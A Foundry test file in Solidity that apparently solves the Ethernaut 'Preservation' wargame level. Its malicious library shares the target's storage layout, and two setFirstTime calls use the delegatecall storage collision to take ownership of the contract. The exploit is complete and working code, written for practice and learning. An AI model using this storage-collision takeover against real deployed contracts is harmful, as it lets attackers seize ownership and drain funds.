// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../src/Preservation.sol";

contract AttackLibrary {
    // IMPORTANT: match storage layout of Preservation (first 3 slots)
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _addr) public {
        owner = address(uint160(_addr));
    }
}

contract PreservationTest is Test {
    Preservation target;
    AttackLibrary attack;

    address player = address(0xBEEF);

    function setUp() public {
        // deploy legit libraries
        LibraryContract lib1 = new LibraryContract();
        LibraryContract lib2 = new LibraryContract();

        target = new Preservation(address(lib1), address(lib2));
        attack = new AttackLibrary();

        vm.startPrank(player);
    }

    function test_PwnPreservation() public {
        console.log("Original owner:", target.owner());

        // step1: overwrite timeZone1Library to point to our malicious library
        target.setFirstTime(uint256(uint160(address(attack))));
        console.log(
            "timeZone1Library after overwrite:",
            target.timeZone1Library()
        );

        // step2: now calling setFirstTime triggers delegatecall into attack library
        target.setFirstTime(uint256(uint160(player)));

        console.log("New owner after exploit:", target.owner());

        assertEq(target.owner(), player, "Exploit failed: owner not changed");
    }
}
